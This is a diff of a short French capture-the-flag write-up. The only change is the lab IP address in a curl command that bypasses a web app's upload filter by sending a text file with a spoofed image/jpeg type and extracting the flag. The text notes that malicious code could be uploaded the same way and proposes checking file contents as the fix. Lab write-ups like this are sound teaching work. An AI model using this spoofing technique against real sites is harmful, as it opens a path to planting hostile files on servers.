@@ -8,7 +8,7 @@ Ici, nous allons uploader un fichier texte, mais nous aurions aussi bien pu uplo
 code.
 
 ```bash
-curl -s -X POST "http://192.168.56.101/index.php?page=upload" -F "Upload=Upload" -F "uploaded=@"<(echo 'hello')";type=image/jpeg" | grep -oP 'The flag is : \K[0-9a-f]{64}'
+curl -s -X POST "http://192.168.56.102/index.php?page=upload" -F "Upload=Upload" -F "uploaded=@"<(echo 'hello')";type=image/jpeg" | grep -oP 'The flag is : \K[0-9a-f]{64}'
 ```
 
 Pour contre-carrer cette attaque, il suffirait de vérifier le contenu du fichier pour s'assurer qu'il s'agit bien d'une
